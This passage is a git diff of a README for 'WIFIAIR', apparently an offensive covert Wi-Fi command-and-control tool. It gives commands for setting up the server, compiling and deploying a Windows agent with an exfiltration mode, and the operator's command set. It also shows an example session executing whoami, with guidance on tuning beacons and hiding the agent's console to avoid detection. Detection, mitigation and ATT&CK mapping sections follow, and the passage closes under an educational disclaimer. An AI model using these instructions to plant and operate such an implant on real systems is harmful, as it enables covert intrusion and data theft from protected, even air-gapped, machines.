   - Wi-Fi card supporting **monitor mode** and **injection**
-  - `scapy`, `iwconfig` installed
-- Physical proximity to target (scalable with antennas)
+  - Python 3 with `scapy`, `pycryptodome` installed
+- Physical proximity to target
 
 **Target Host:**
-- Windows machine with Wi-Fi enabled
+- Windows 8+ with Wi-Fi enabled
 - WLAN service active
 - Agent binary deployed (via initial compromise, USB, physical access)
 
-### 6.2 Server Setup (Kali)
+### 10.2 Server Setup (Kali)
 
 ```bash
+# Install dependencies
+pip install scapy pycryptodome
+
 # Kill interfering processes
 sudo airmon-ng check kill
 
 # Enable monitor mode
 sudo airmon-ng start wlan0
 
-# Lock to channel 6 (required for stable identity)
-sudo iwconfig wlan0mon channel 6
-
-# Start server with response listener
+# Start server with response listener and channel hopping
 sudo python3 server.py -listen -i wlan0mon
+
+# Or: fixed channel (no hopping)
+sudo python3 server.py -listen -i wlan0mon -channel 6
 ```
 
-### 6.3 Agent Deployment (Windows)
+### 10.3 Agent Compilation
 
-**Compilation (MinGW):**
+**Visual Studio:**
+
+Open solution → Build as Release x64.
+
+**MinGW:**
 
 ```bash
-g++ WIFIAIR-C2-Channel-VSE.cpp -o agent.exe -lwlanapi -static
+g++ WIFIAIR-C2-Channel-VSE.cpp -o agent.exe -lwlanapi -lbcrypt -static
 ```
 
-**Compilation (Visual Studio):**
-
-Open solution, build as Release x64.
-
-**Deployment:**
+### 10.4 Agent Deployment (Windows)
 
 ```powershell
-# Basic (no exfil)
+# Receive-only (stealth, zero upstream traffic)
 agent.exe -agent 1
 
-# With exfiltration
+# Bidirectional (stealth, ACK + exfil)
 agent.exe -agent 1 -exfil -duration 60
 
-# With custom jitter (slower, stealthier)
-agent.exe -agent 1 -exfil -duration 60 -jitter 3000 5000
+# Debug mode (visible console for testing)
+agent.exe -agent 1 -exfil -duration 60 -debug
+
+# Custom jitter
+agent.exe -agent 1 -exfil -duration 120 -jitter 1000 3000
 ```
 
-### 6.4 Sending Commands
+### 10.5 Server Commands
 
-**Unicast (to specific agent):**
+```text
+C2> send 1 whoami                 # Send to Agent 1
+C2> send 0 hostname               # Broadcast to all agents
+C2> send 2 dir C:\Users           # List directory
+C2> send 1 ipconfig /all          # Shell command (queued)
+C2> stop                           # Stop current broadcast
+C2> skip                           # Stop current, start next in queue
+C2> queue                          # Show pending jobs
+C2> remove 2                       # Remove job #2 from queue
+C2> remove 0xa1b2                  # Remove job by hex ID
+C2> flush                          # Clear entire queue + stop
+C2> agents                         # Show known agents
+C2> status                         # Show server state
+C2> responses                      # Show pending response buffers
+C2> hop on                         # Enable channel hopping
+C2> hop off                        # Disable channel hopping
+C2> jitter 50 200                  # Set beacon jitter (ms)
+C2> clear                          # Clear response history
+C2> exit                           # Quit
+```
+
+### 10.6 Example Session
 
 ```text
 C2> send 1 whoami
-[+] Sending Job 0x8a1f to Agent 1 (1 chunks)
-```
-
-**Broadcast (to all agents):**
-
-```text
-C2> send 0 hostname
-[+] Broadcasting Job 0x3cf2 to ALL agents (1 chunks)
-```
-
-### 6.5 Receiving Responses
-
-```text
-[<] Agent 1 responding (Job 0x8a1f, 2 chunks)...
+[+] Queued Job 0xa1b2 -> Agent 1 (1 chunks, queue depth: 0)
+[>] Broadcasting Job 0xa1b2 -> Agent 1 (1 chunks)
+[+] ACK from Agent 1 for Job 0xa1b2 - command delivered
+[<] Agent 1 responding (Job 0xa1b2, 2 chunks)...
 ============================================================
-[+] Agent 1 | Job 0x8a1f | 3.2s
+[+] Agent 1 | Job 0xa1b2 | 4.2s
 ============================================================
 desktop-vixx\user
 ============================================================
 ```
 
-### 6.6 Exfil Status Symbols
+Meanwhile on the agent (with `-exfil -duration 60`):
 
-| Symbol | Meaning |
-|:------:|:--------|
-| `.` | Success - Probe request transmitted |
-| `!` | Driver busy - Will retry |
-| `X` | Failed - All retries exhausted |
-
-**Troubleshooting:** Many `!` or `X` symbols indicate jitter is too low. Increase with `-jitter 3000 5000`.
+```text
+[*] New Job 0xa1b2 (Target: Agent 1)
+[+] EXECUTE: whoami
+[+] ACK sent for Job 0xa1b2
+[+] OUTPUT (18 bytes):
+desktop-vixx\user
+[*] Exfiltrating Job 0xa1b2 (18 bytes)...
+[*] Exfil Job 0xa1b2: 40B b64 (2 chunks)
+.. [DONE]
+[+] Server ACK received! Stopping exfil early.    ← stopped at ~8s instead of 60s
+[*] Exfil complete for Job 0xa1b2
+[*] Exfil queue drained. Returning to scan mode.
+```
 
 ---
 
-## 7. Bandwidth & Limitations
+## 11. Bandwidth & Limitations
 
-### 7.1 Bandwidth Comparison
+### 11.1 Bandwidth
 
 | Direction | Method | Bandwidth | Capacity |
 |:---|:---|:---|:---|
 | **Downstream** | VSE Stacking (5 tags) | ~10 KB/s | Shellcode, scripts, binaries |
-| **Upstream** | Probe Request SSIDs | ~50 Bytes/s | Short text only |
+| **Upstream** | Probe Request SSIDs | ~50 B/s | Short text only |
 
-### 7.2 Range Asymmetry
+### 11.2 Range Asymmetry
 
 | Direction | Range | Reason |
 |:---|:---|:---|
 | **Downstream** | High (1+ km with directional antenna) | Attacker controls Tx power |
 | **Upstream** | Low (~50-100m) | Victim laptop has weak internal antenna |
 
-**Implication:** You can send commands from far away, but must be closer to receive responses.
+**Implication:** You can send commands from far away, but must be closer to receive responses. Use **receive-only mode** for long-range operations and rely on the target reaching the internet for confirmation.
 
-### 7.3 Operational Advice
+### 11.3 Operational Advice
 
 - **Keep responses short:** Use `findstr`, `head`, `| select` to filter output
 - **Process on target:** Send scripts that analyze data locally, return only results
 - **Avoid large exfil:** A 10MB file would take hours and generate thousands of packets
 
----
+### 11.4 Tuning VSE Parameters
 
-## 8. Abuse Potential & Threat Model
+Two values in `server.py` control how commands are packed into beacon frames. Adjust these to trade speed for stealth:
 
-### 8.1 Initial Access Vectors
+```python
+TAGS_PER_BEACON = 5    # VSE tags per beacon frame (1-5)
+CHUNK_SZ = 243         # Data bytes per VSE tag (max 243 = 255 - 12 header)
+```
 
-The agent must first be deployed:
+**`TAGS_PER_BEACON`** — how many Tag 221 elements are stacked into a single beacon:
 
-- **Phishing / Malware:** Dropper installs agent with persistence
-- **USB / BadUSB:** HID attack downloads and executes agent
-- **Physical Access:** Plant agent on unlocked workstation
+| Value | Beacon Size | Speed | Stealth |
+|:------|:------------|:------|:--------|
+| `5` (default) | ~1.2 KB | Fast | Lower (large beacons are anomalous) |
+| `3` | ~750 B | Medium | Better |
+| `1` | ~255 B | Slow | Best (single VSE looks normal) |
 
-Once resident, **all subsequent C2 is RF-only**.
+**`CHUNK_SZ`** — data bytes per VSE tag (before adding the 12-byte header):
 
-### 8.2 RF / Physical Proximity
+| Value | VSE Size | Looks Like | Trade-off |
+|:------|:---------|:-----------|:----------|
+| `243` (default) | 255 B | Max-size VSE (suspicious) | Fewest packets needed |
+| `100` | 112 B | Medium vendor extension | Good balance |
+| `50` | 62 B | Small vendor tag | Realistic, more packets |
+| `20` | 32 B | Tiny vendor tag | Very stealthy, many packets |
 
-Key advantages:
-- No corporate VPN or internet required
-- No firewall logs (operates below IP layer)
-- Works on "air-gapped" systems with Wi-Fi enabled
-- Scalable range with antenna equipment
+**Example — maximum stealth profile:**
 
-### 8.3 Operational Scenarios
+```python
+TAGS_PER_BEACON = 1    # One VSE per beacon
+CHUNK_SZ = 50          # Small, realistic-looking vendor tags
+```
 
-- **Parking lot operations:** Directional antenna from vehicle
-- **Adjacent building:** Yagi antenna through windows
-- **Embedded implant:** Leave a Pineapple-style device inside building
-- **Walk-by activation:** Trigger agent while passing through facility
+This makes each beacon look like a normal AP with a single small vendor extension. A `whoami` command would need ~2 beacons instead of 1, but each beacon blends in with legitimate traffic.
 
----
-
-## 9. Detection & Mitigation
-
-### 9.1 Network/RF Detection
-
-- **Anomalous VSE size:** Legitimate VSE tags are small (vendor identifiers). 1KB+ VSE is suspicious.
-- **BSSID/SSID mismatch:** A "linksys" SSID with non-Linksys OUI prefix
-- **Probe Request patterns:** High-entropy SSIDs matching `00:40:97` prefix
-- **Beacon timing:** Jittered beacons may have different timing signatures than real APs
-
-### 9.2 Host-Based Detection
-
-- **WLAN API abuse:** Processes calling `WlanGetNetworkBssList` frequently without user interaction
-- **IE parsing:** Non-system processes accessing raw IE data
-- **Probe injection:** Applications triggering `WlanScan` with custom SSIDs
-
-### 9.3 Mitigation
-
-- **Disable Wi-Fi** on air-gapped systems
-- **Application whitelisting:** Block unknown binaries
-- **Wireless IDS:** Monitor for anomalous beacon/probe activity
-- **Physical security:** RF sweeps of sensitive areas
-
-### 9.4 MITRE ATT&CK Mapping
-
-- **T1071.001** - Application Layer Protocol (adapted to 802.11)
-- **T1095** - Non-Application Layer Protocol
-- **T1020** - Automated Exfiltration
-- **T1029** - Scheduled Transfer (blocking exfil mode)
+The agent doesn't need any changes — it reassembles by sequence number regardless of chunk size or tags per beacon.
 
 ---
 
-## 10. Summary
+## 12. Security Analysis
 
-WIFIAIR 2.0 demonstrates:
+### 12.1 Cryptographic Properties
 
-- **High-bandwidth downstream** via VSE stacking (~1.2 KB/packet)
-- **Bidirectional communication** with Probe Request exfiltration
-- **Stealth operation** via vendor masquerading and jitter
-- **Multi-agent targeting** with unicast and broadcast support
-- **Air-gap bridging** using only RF proximity
+| Property | v2.0 (RC4) | v3.0 (AES-256-CTR) |
+|:---|:---|:---|
+| Key size | 128-bit | **256-bit** |
+| Nonce | None (static key) | **12-byte random per message** |
+| Known-plaintext | Vulnerable | Resistant |
+| Keystream bias | Yes (RC4 bias) | None |
+| Replay protection | None | Nonce uniqueness |
+| Implementation | Custom | **BCrypt** (OS-provided, audited) |
+
+### 12.2 Signature Resistance
+
+| Indicator | v2.0 | v3.0 |
+|:---|:---|:---|
+| OUI pattern | Fixed `00:40:96` / `00:40:97` | **Derived from PSK** (changes per deployment) |
+| Ciphertext patterns | Identical for same command | **Unique per message** (random nonce) |
+| Channel behavior | Fixed channel 6 | **Hopping** (harder to capture) |
+| Console window | Always visible | **Hidden by default** (`FreeConsole`) |
+| Process tree | `agent.exe → cmd.exe` | `CreateProcess` with `CREATE_NO_WINDOW` |
+| Upstream traffic | Always transmitting | **Configurable** (zero in receive-only mode) |
+
+---
+
+## 13. Detection & Mitigation
+
+### 13.1 Network/RF Detection
+
+- **Anomalous VSE size:** Legitimate VSE tags are typically small. Multiple 255-byte Tag 221 elements in a single beacon are suspicious.
+- **Beacon timing analysis:** Even with jitter, statistical analysis of inter-beacon intervals may reveal non-standard patterns.
+- **Channel hopping correlation:** A BSSID that appears on multiple channels in a short period is unusual for a real AP.
+- **Probe Request entropy:** High-entropy SSIDs in Probe Requests, especially with consistent 32-byte lengths.
+- **Volume anomaly:** Bursts of Probe Requests from a single station during exfil mode.
+
+### 13.2 Host-Based Detection
+
+- **WLAN API abuse:** Non-system processes calling `WlanGetNetworkBssList` or `WlanScan` at high frequency.
+- **BCrypt usage patterns:** A non-browser process using `BCryptEncrypt` with AES + `BCryptGenRandom` together.
+- **Stealth indicators:** Process calling `FreeConsole()` shortly after start, or `CreateProcess` with `CREATE_NO_WINDOW`.
+
+### 13.3 Mitigation
+
+- **Disable Wi-Fi** on air-gapped systems (hardware kill switch preferred)
+- **Application whitelisting** to block unknown binaries
+- **Wireless IDS** monitoring for anomalous beacon/probe activity
+- **Physical security** with RF sweeps of sensitive areas
+- **EDR rules** for WLAN API abuse by non-system processes
+
+### 13.4 MITRE ATT&CK Mapping
+
+- **T1071.001** — Application Layer Protocol (adapted to 802.11)
+- **T1095** — Non-Application Layer Protocol
+- **T1020** — Automated Exfiltration
+- **T1029** — Scheduled Transfer (blocking exfil mode)
+- **T1027** — Obfuscated Files or Information (AES-256 encryption)
+- **T1573** — Encrypted Channel
+- **T1132** — Data Encoding (Base64)
+
+---
+
+## 14. Summary
+
+WIFIAIR v3.0 delivers a production-grade covert Wi-Fi C2 channel with:
+
+- **AES-256-CTR encryption** with per-message random nonces (via BCrypt)
+- **ACK/retransmit protocol** with inter-pass scanning — server ACK stops exfil early
+- **Derived OUI** eliminating static IDS signatures
+- **FIFO job queue** with `skip`, `remove`, and `flush` for full queue control
+- **Channel hopping** on a shared PRNG schedule
+- **Agent tracking** via ACK probes and response data
+- **Stealth by default** with `FreeConsole` and `CreateProcess` + `CREATE_NO_WINDOW` (`-debug` for testing)
+- **Receive-only mode** with zero upstream traffic for long-range operations
+- **Encrypt-once exfil** ensuring fragments from different retransmit passes are always compatible
 
 The technique is relevant for:
 
@@ -684,7 +632,7 @@ The technique is relevant for:
 
 ---
 
-## 11. Disclaimer
+## 15. Disclaimer
 
 **Educational Purpose Only.**
 
